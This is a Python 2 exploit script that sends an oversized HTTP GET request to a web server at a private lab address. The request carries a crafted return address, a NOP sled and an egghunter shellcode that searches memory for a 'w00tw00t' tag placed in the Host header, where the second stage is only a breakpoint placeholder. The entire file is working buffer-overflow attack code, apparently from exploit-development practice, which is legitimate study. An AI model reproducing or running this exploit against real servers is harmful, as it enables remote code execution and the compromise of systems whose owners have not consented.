#!/usr/bin/python

import socket
import os
import sys
import struct

ip = "192.168.100.120"
port = 8080

# w00tw00t
egghunter  = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
egghunter += "\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

revshell  = "w00tw00t"
revshell += "\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc"

crash  = "A" * 101
crash += struct.pack("<I", 0x75f5365f)
crash += "\x90" * 30
crash += egghunter
crash += "C" * (330 - len(crash))

req  = "GET /" + crash + " HTTP/1.1\r\n"
req += "Host: 192.168.100.120:8080 " + revshell + " \r\n"
req += "User-Agent: Mozilla/5.0 \r\n"
req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
req += "Accept-Language: en-US,en;q=0.5\r\n"
req += "Accept-Encoding: gzip, deflate\r\n"
req += "Connection: close\r\n"
req += "Upgrade-Insecure-Requests: 1\r\n\r\n\r\n"

print "[*] Sending evil http request to target"
expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
expl.connect((ip, port))
expl.send(req)
expl.close()

